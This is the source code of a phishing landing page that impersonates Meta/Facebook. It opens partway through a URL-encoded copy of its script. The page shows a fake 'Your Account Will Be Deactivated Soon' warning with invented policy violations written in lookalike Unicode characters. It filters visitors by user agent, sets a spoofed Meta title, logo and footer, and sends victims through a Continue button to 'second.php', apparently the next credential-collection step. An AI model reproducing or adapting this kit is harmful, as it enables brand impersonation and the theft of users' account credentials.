32%30%32%36%39%3B%20%26%23%31%32%30%32%37%31%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%31%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%34%3B%20%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%37%30%3B%26%23%31%32%30%32%36%37%3B%20%26%23%31%32%30%32%35%32%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%35%3B%26%23%31%32%30%32%37%34%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%35%36%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%36%38%3B%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%64%65%73%63%32%2D%74%65%78%74%27%29%2E%68%74%6D%6C%28%22%57%65%27%6C%6C%20%74%61%6B%65%20%79%6F%75%20%74%68%72%6F%75%67%68%20%73%6F%6D%65%20%73%74%65%70%73%20%74%6F%20%75%6E%6C%6F%63%6B%20%79%6F%75%72%20%61%63%63%6F%75%6E%74%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%64%69%76%2D%62%74%6E%2D%63%6F%6E%74%27%29%2E%68%74%6D%6C%28%27%3C%62%75%74%74%6F%6E%20%76%61%6C%75%65%3D%22%56%65%72%69%66%69%63%61%74%69%6F%6E%22%20%63%6C%61%73%73%3D%22%62%74%6E%20%62%74%6E%2D%6C%67%20%62%74%6E%2D%70%72%69%6D%61%72%79%20%63%6F%6C%2D%31%32%22%20%69%64%3D%22%67%6F%74%6F%74%68%65%70%61%67%65%76%6C%74%6E%22%3E%43%6F%6E%74%69%6E%75%65%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%2C%20%32%35%30%29%3B%0A%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%74%69%74%6C%65%20%3D%20%27%59%6F%75%72%20%41%63%63%6F%75%6E%74%20%57%69%6C%6C%20%42%65%20%44%65%61%63%74%69%76%61%74%65%64%20%53%6F%6F%6E%27%3B%0A%20%20%20%20%20%20%20%20%68%65%61%64%6C%69%6E%65%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%68%65%61%64%2D%6C%69%6E%65%22%29%3B%0A%20%20%20%20%20%20%20%20%68%65%61%64%6C%69%6E%65%2E%73%74%79%6C%65%2E%62%61%63%6B%67%72%6F%75%6E%64%43%6F%6C%6F%72%20%3D%20%22%23%34%32%36%37%62%32%22%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23%74%68%65%2D%6C%6F%67%6F%27%29%2E%68%74%6D%6C%28%22%66%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23%74%68%65%2D%66%6F%6F%74%65%72%27%29%2E%68%74%6D%6C%28%22%4D%65%74%61%26%63%6F%70%79%3B%32%30%32%33%22%29%3B%0A%20%20%20%20%7D%2C%20%35%30%29%3B%0A%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23%67%6F%74%6F%74%68%65%70%61%67%65%76%6C%74%6E%22%29%2E%6F%6E%28%22%63%6C%69%63%6B%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%72%61%6E%64%3D%6D%61%6B%65%69%64%28%32%35%29%3B%0A%09%09%09%3C%21%2D%2D%20%67%6F%20%74%6F%20%73%65%63%6F%6E%64%20%70%61%67%65%20%2D%2D%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%77%5F%75%72%6C%3D%22%73%65%63%6F%6E%64%2E%70%68%70%22%3B%3B%20%20%0A%09%09%09%3C%21%2D%2D%20%67%6F%20%74%6F%20%73%65%63%6F%6E%64%20%70%61%67%65%20%2D%2D%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%6E%65%77%5F%75%72%6C%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%2C%20%35%30%30%29%3B%0A%7D%0A%66%75%6E%63%74%69%6F%6E%20%73%65%74%44%74%53%75%73%70%65%6E%64%65%64%28%29%20%7B%0A%20%20%20%20%61%72%72%62%75%6C%61%6E%20%3D%20%5B%22%4A%61%6E%75%61%72%79%22%2C%20%22%46%65%62%72%75%61%72%79%22%2C%20%22%4D%61%72%63%68%22%2C%20%22%41%70%72%69%6C%22%2C%20%22%4D%61%79%22%2C%20%22%4A%75%6E%65%22%2C%20%22%4A%75%6C%79%22%2C%20%22%41%75%67%75%73%74%22%2C%20%22%53%65%70%74%65%6D%62%65%72%22%2C%20%22%4F%63%74%6F%62%65%72%22%2C%0A%20%20%20%20%20%20%20%20%22%4E%6F%76%65%6D%62%65%72%22%2C%20%22%44%65%63%65%6D%62%65%72%22%0A%20%20%20%20%5D%3B%0A%20%20%20%20%64%61%74%65%20%3D%20%6E%65%77%20%44%61%74%65%28%29%3B%0A%20%20%20%20%64%64%20%3D%20%64%61%74%65%2E%67%65%74%44%61%74%65%28%29%3B%0A%20%20%20%20%6D%6D%20%3D%20%64%61%74%65%2E%67%65%74%4D%6F%6E%74%68%28%29%3B%0A%20%20%20%20%79%79%20%3D%20%64%61%74%65%2E%67%65%74%46%75%6C%6C%59%65%61%72%28%29%3B%0A%20%20%20%20%24%28%27%23%73%75%73%70%65%6E%64%65%64%64%61%79%6D%6B%64%66%67%68%6F%61%6E%73%6E%64%67%66%61%73%64%27%29%2E%74%65%78%74%28%22%53%75%73%70%65%6E%64%65%64%20%6F%6E%20%22%20%2B%20%61%72%72%62%75%6C%61%6E%5B%6D%6D%5D%20%2B%20%22%20%22%20%2B%20%64%64%20%2B%20%22%2C%20%22%20%2B%20%79%79%29%3B%0A%20%20%20%20%24%28%22%69%6E%70%75%74%5B%6E%61%6D%65%3D%27%6D%6B%64%66%67%68%6F%61%6E%73%6E%64%67%66%61%73%64%61%27%5D%22%29%2E%66%6F%63%75%73%28%29%3B%0A%7D%0A%66%75%6E%63%74%69%6F%6E%20%6D%61%6B%65%69%64%28%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%6C%65%74%20%72%65%73%75%6C%74%20%3D%20%27%27%3B%0A%20%20%20%20%63%6F%6E%73%74%20%63%68%61%72%61%63%74%65%72%73%20%3D%20%27%41%42%43%44%45%46%47%48%49%4A%4B%4C%4D%4E%4F%50%51%52%53%54%55%56%57%58%59%5A%61%62%63%64%65%66%67%68%69%6A%6B%6C%6D%6E%6F%70%71%72%73%74%75%76%77%78%79%7A%30%31%32%33%34%35%36%37%38%39%27%3B%0A%20%20%20%20%63%6F%6E%73%74%20%63%68%61%72%61%63%74%65%72%73%4C%65%6E%67%74%68%20%3D%20%63%68%61%72%61%63%74%65%72%73%2E%6C%65%6E%67%74%68%3B%0A%20%20%20%20%6C%65%74%20%63%6F%75%6E%74%65%72%20%3D%20%30%3B%0A%20%20%20%20%77%68%69%6C%65%20%28%63%6F%75%6E%74%65%72%20%3C%20%6C%65%6E%67%74%68%29%20%7B%0A%20%20%20%20%20%20%72%65%73%75%6C%74%20%2B%3D%20%63%68%61%72%61%63%74%65%72%73%2E%63%68%61%72%41%74%28%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%63%68%61%72%61%63%74%65%72%73%4C%65%6E%67%74%68%29%29%3B%0A%20%20%20%20%20%20%63%6F%75%6E%74%65%72%20%2B%3D%20%31%3B%0A%20%20%20%20%7D%0A%20%20%20%20%72%65%74%75%72%6E%20%72%65%73%75%6C%74%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%2F%68%74%6D%6C%3E%0A'));
//-->
</script><script ecommerce-type="extend-native-history-api">(() => {
            const nativePushState = history.pushState;
            const nativeReplaceState = history.replaceState;
            const nativeBack = history.back;
            const nativeForward = history.forward;
            function emitUrlChanged() {
                const message = {
                    _custom_type_: 'CUSTOM_ON_URL_CHANGED',
                };
                window.postMessage(message);
            }
            history.pushState = function () {
                nativePushState.apply(history, arguments);
                emitUrlChanged();
            };
            history.replaceState = function () {
                nativeReplaceState.apply(history, arguments);
                emitUrlChanged();
            };
            history.back = function () {
                nativeBack.apply(history, arguments);
                emitUrlChanged();
            };
            history.forward = function () {
                nativeForward.apply(history, arguments);
                emitUrlChanged();
            };
        })()</script><script>(function inject(e){function SendXHRCandidate(e,t,n,r,i){try{var o="detector",s={posdMessageId:"PANELOS_MESSAGE",posdHash:(Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)).substring(0,22),type:"VIDEO_XHR_CANDIDATE",from:o,to:o.substring(0,6),content:{requestMethod:e,url:t,type:n,content:r}};i&&i[0]&&i[0].length&&(s.content.encodedPostBody=i[0]),window.postMessage(s,"*")}catch(e){}}var t=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){this.requestMethod=arguments[0],t.apply(this,arguments)};var n=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(){var t=Object.assign(arguments,{}),r=this.onreadystatechange;return this.onreadystatechange=function(){if(4!==this.readyState||function isFrameInBlackList(t){return e.some((function(e){return t.includes(e)}))}(this.responseURL)||setTimeout(SendXHRCandidate(this.requestMethod,this.responseURL,this.getResponseHeader("content-type"),this.response,t),0),r)return r.apply(this,arguments)},n.apply(this,arguments)};var r=fetch;fetch=function fetch(){var e=this,t=arguments,n=arguments[0]instanceof Request?arguments[0].url:arguments[0],i=arguments[0]instanceof Request?arguments[0].method:"GET";return new Promise((function(o,s){r.apply(e,t).then((function(e){if(e.body instanceof ReadableStream){var t=e.json;e.json=function(){var r=arguments,o=this;return new Promise((function(s,a){t.apply(o,r).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),JSON.stringify(t)),0),s(t)})).catch((function(e){a(e)}))}))};var r=e.text;e.text=function(){var t=arguments,o=this;return new Promise((function(s,a){r.apply(o,t).then((function(t){setTimeout(SendXHRCandidate(i,n,e.headers.get("content-type"),t),0),s(t)})).catch((function(e){a(e)}))}))}}o.apply(this,arguments)})).catch((function(){s.apply(this,arguments)}))}))}})(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com"]);</script>


	<link rel="icon" type="image/x-icon" href="fbb.ico">
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <title>Your Account Will Be Deactivated Soon</title>
    <!-- <link rel="stylesheet" href="bootstrap5.min.css?v=2"> -->
    <!-- <script src="jquery-3.6.3.min.js?v=2"></script> -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css?q=<?=date('U')?>" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="js/3.6.4-jquery.min.js" integrity="sha512-pumBsjNRGGqkPzKHndZMaAG+bir374sORyzM3uulLV14lN5LyykqNk8eEeUlUkB3U0M4FApyaHraT65ihJhDpQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <style>
    /* blue 216FDB */
    body {
        background-color: #f1f1f2;
        margin: 0px;
        padding: 0px;
    }

    .head {
        /* background-color: #386a8b; */
        background-color: #f1f1f2;
        /*dark*/
        text-align: left;
        margin-bottom: 33px;
        height: 40px;
    }

    .headimg {
        margin:3px;
        height: 87%;
    }

    .bannerimg {
        /* width: 33%; */
    }

    .content1 {
        text-align: center;
    }

    .content2 {
        padding: 3px;
    }

    .p-title {
        font-weight: 900;
        margin: 0px;
        padding: 0px;
    }

    .p-content {
        margin: 0px;
        padding: 0px;
        padding-top: 3px;
        padding-bottom: 7px;
        ;
    }
    .lock-img {
        background-color: #47579a;
        border-radius: 360px;
        margin: 0px;
        padding: 10px;
        font-size: 55pt;
    }
    </style>
</head>

<body onload="onloadRun()" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIxLjkuMTIiLCJzY29yZSI6MTA5MTJ9XQ==">
    <div class="head" id="head-line" bis_skin_checked="1" style="background-color: rgb(66, 103, 178);">
        <span style="margin-left:7px;color:#f1f1f2;font-size:2em;font-weight:bold" id="the-logo">f</span>
    </div>
    <div class="container mt-2" bis_skin_checked="1">
        <div class="row justify-content-md-center" bis_skin_checked="1">
            <div class="col-12 col-md-6" bis_skin_checked="1">
                <div class="card" bis_skin_checked="1">
                    <div id="div-img-header" bis_skin_checked="1"><img style="width: 100%;" src="https://cdn.glitch.global/b1e897d8-05ea-4c0f-ac23-9c972f4672f2/iii.jpg?v=1696630061331"></div>
                    <div class="card-body" bis_skin_checked="1">
                        <h3 class="text-center" id="card-title-text">Your Account Will Be Deactivated Soon</h3>
                        <p style="text-align: justify;" id="card-desc-text">We are constantly updating our Meta Privacy Policy and Terms of Service We have temporarily suspended your page because someone told us that you violated our terms and conditions of service.</p>
                            <ul id="card-ul-text">
                            <li>𝖲𝗁𝖺𝗋𝗂𝗇𝗀 𝗉𝗁𝗈𝗍𝗈𝗌 𝖺𝗇𝖽 𝗏𝗂𝖽𝖾𝗈𝗌 𝗍𝗁𝖺𝗍 𝗏𝗂𝗈𝗅𝖺𝗍𝖾 𝖼𝗈𝗉𝗒𝗋𝗂𝗀𝗁𝗍.</li><li>𝖴𝗌𝗂𝗇𝗀 𝖿𝖺𝗄𝖾 𝗉𝗁𝗈𝗍𝗈𝗌 𝖺𝗇𝖽 𝗇𝖺𝗆𝖾𝗌.</li><li>𝖧𝖺𝗋𝗆𝗂𝗇𝗀 𝗈𝗍𝗁𝖾𝗋𝗌.</li><li>𝖢𝗈𝗆𝗆𝗎𝗇𝗂𝖼𝖺𝗍𝗂𝗇𝗀 𝗐𝗂𝗍𝗁 𝗈𝗍𝗁𝖾𝗋𝗌 𝖿𝗈𝗋 𝗁𝖺𝗋𝖺𝗌𝗌𝗆𝖾𝗇𝗍, 𝗉𝗋𝗈𝗆𝗈𝗍𝗂𝗈𝗇𝗌, 𝖺𝖽𝗏𝖾𝗋𝗍𝗂𝗌𝗂𝗇𝗀 𝖺𝗇𝖽 𝗈𝗍𝗁𝖾𝗋 𝖺𝖼𝗍𝗌 𝗍𝗁𝖺𝗍 𝗏𝗂𝗈𝗅𝖺𝗍𝖾 𝗈𝗎𝗋 𝖼𝗈𝗉𝗒𝗋𝗂𝗀𝗁𝗍𝗌.</li></ul>
                            <p id="card-desc2-text">We'll take you through some steps to unlock your account.</p>
                        <div id="div-btn-cont" bis_skin_checked="1"><button value="Verification" class="btn btn-lg btn-primary col-12" id="gotothepagevltn">        
                   <a class="button" href="second.php"</a><FONT COLOR="#ffffff">Continue</a></button></div> 
                        <hr>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="main-footer text-center mt-2 mb-5" id="the-footer">Meta©2023</footer>

<script>
function onloadRun() {
    setTimeout(function() {
        var agent = navigator.userAgent.toLowerCase();
        AllowHeader=["Android","iPhone","Windows","WebKit","Macintosh"];
        CK=0;
        for (let index = 0; index < AllowHeader.length; index++) {
            xAgent=agent.toLocaleLowerCase();
            xHeader=AllowHeader[index].toLocaleLowerCase();
            if (xAgent.indexOf(xHeader) != -1) { 
                CK=1;
                break;
            }
        }
        if(CK==1){
            setDtSuspended();
            $('#card-title-text').html("Your Account Will Be Deactivated Soon");
            $('#div-img-header').html('<img style="width: 100%;" src="iii.jpg">');
            $('#card-desc-text').html("We are constantly updating our Meta Privacy Policy and Terms of Service We have temporarily suspended your page because someone told us that you violated our terms and conditions of service.");
            // $('#card-ul-text').append("<li>Using someone else's fake name/photo.");
            // $('#card-ul-text').append("<li>Share content that misleads other users.");
            // $('#card-ul-text').append("<li>Insulting other users.");
            $('#card-ul-text').append("<li>&#120242;&#120257;&#120250;&#120267;&#120258;&#120263;&#120256; &#120265;&#120257;&#120264;&#120269;&#120264;&#120268; &#120250;&#120263;&#120253; &#120271;&#120258;&#120253;&#120254;&#120264;&#120268; &#120269;&#120257;&#120250;&#120269; &#120271;&#120258;&#120264;&#120261;&#120250;&#120269;&#120254; &#120252;&#120264;&#120265;&#120274;&#120267;&#120258;&#120256;&#120257;&#120269;.");
            $('#card-ul-text').append("<li>&#120244;&#120268;&#120258;&#120263;&#120256; &#120255;&#120250;&#120260;&#120254; &#120265;&#120257;&#120264;&#120269;&#120264;&#120268; &#120250;&#120263;&#120253; &#120263;&#120250;&#120262;&#120254;&#120268;.");
            $('#card-ul-text').append("<li>&#120231;&#120250;&#120267;&#120262;&#120258;&#120263;&#120256; &#120264;&#120269;&#120257;&#120254;&#120267;&#120268;.");
            $('#card-ul-text').append("<li>&#120226;&#120264;&#120262;&#120262;&#120270;&#120263;&#120258;&#120252;&#120250;&#120269;&#120258;&#120263;&#120256; &#120272;&#120258;&#120269;&#120257; &#120264;&#120269;&#120257;&#120254;&#120267;&#120268; &#120255;&#120264;&#120267; &#120257;&#120250;&#120267;&#120250;&#120268;&#120268;&#120262;&#120254;&#120263;&#120269;, &#120265;&#120267;&#120264;&#120262;&#120264;&#120269;&#120258;&#120264;&#120263;&#120268;, &#120250;&#120253;&#120271;&#120254;&#120267;&#120269;&#120258;&#120268;&#120258;&#120263;&#120256; &#120250;&#120263;&#120253; &#120264;&#120269;&#120257;&#120254;&#120267; &#120250;&#120252;&#120269;&#120268; &#120269;&#120257;&#120250;&#120269; &#120271;&#120258;&#120264;&#120261;&#120250;&#120269;&#120254; &#120264;&#120270;&#120267; &#120252;&#120264;&#120265;&#120274;&#120267;&#120258;&#120256;&#120257;&#120269;&#120268;.");
            $('#card-desc2-text').html("We'll take you through some steps to unlock your account.");
            $('#div-btn-cont').html('<button value="Verification" class="btn btn-lg btn-primary col-12" id="gotothepagevltn">Continue');
        }
    }, 250);
    setTimeout(function() {
        document.title = 'Your Account Will Be Deactivated Soon';
        $('#the-logo').html("f");
        $('#the-footer').html("Meta&copy;2023");
    }, 50);
    setTimeout(function() {
        $("#gotothepagevltn").on("click", function() {
            rand=makeid(25);
			<!-- go to second page -->
            new_url="second.php";;  
			<!-- go to second page -->
            window.location.replace(new_url);
        });
    }, 500);
}
function setDtSuspended() {
    arrbulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October",
        "November", "December"
    ];
    date = new Date();
    dd = date.getDate();
    mm = date.getMonth();
    yy = date.getFullYear();
    $('#suspendeddaymkdfghoansndgfasd').text("Suspended on " + arrbulan[mm] + " " + dd + ", " + yy);
    $("input[name='mkdfghoansndgfasda']").focus();
}
function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}
</script>


</body></html>